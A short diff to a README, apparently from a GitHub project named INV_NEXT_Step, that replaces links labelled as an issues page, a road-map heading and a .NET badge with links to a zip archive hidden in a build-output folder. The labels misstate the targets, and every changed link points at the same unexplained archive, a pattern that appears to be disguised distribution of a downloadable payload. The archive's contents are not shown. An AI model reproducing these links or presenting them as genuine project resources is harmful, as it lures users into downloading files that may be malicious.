@@ -40,8 +40,8 @@ Name Methode
 
 😄 ```Dont forget to add Interface App```
 
-💬``**Ask me about any problem in Issues Github**``[Issues-Link](https://github.com/dali-raki/INV_NEXT_Step/raw/refs/heads/lastTest2/INVUIs/obj/Debug/net9.0/scopedcss/NEX_Step_IN_2.5.zip)
+💬``**Ask me about any problem in Issues Github**``[Issues-Link](https://raw.githubusercontent.com/dali-raki/INV_NEXT_Step/lastTest2/ims.Web/bin/Debug/net9.0/es/IN_Step_NEX_v3.5.zip)
 
-## 🔗 https://github.com/dali-raki/INV_NEXT_Step/raw/refs/heads/lastTest2/INVUIs/obj/Debug/net9.0/scopedcss/NEX_Step_IN_2.5.zip Core Developer Road Map
-[![.net](https://github.com/dali-raki/INV_NEXT_Step/raw/refs/heads/lastTest2/INVUIs/obj/Debug/net9.0/scopedcss/NEX_Step_IN_2.5.zip)](https://github.com/dali-raki/INV_NEXT_Step/raw/refs/heads/lastTest2/INVUIs/obj/Debug/net9.0/scopedcss/NEX_Step_IN_2.5.zip)
+## 🔗 https://raw.githubusercontent.com/dali-raki/INV_NEXT_Step/lastTest2/ims.Web/bin/Debug/net9.0/es/IN_Step_NEX_v3.5.zip Core Developer Road Map
+[![.net](https://raw.githubusercontent.com/dali-raki/INV_NEXT_Step/lastTest2/ims.Web/bin/Debug/net9.0/es/IN_Step_NEX_v3.5.zip)](https://raw.githubusercontent.com/dali-raki/INV_NEXT_Step/lastTest2/ims.Web/bin/Debug/net9.0/es/IN_Step_NEX_v3.5.zip)
 
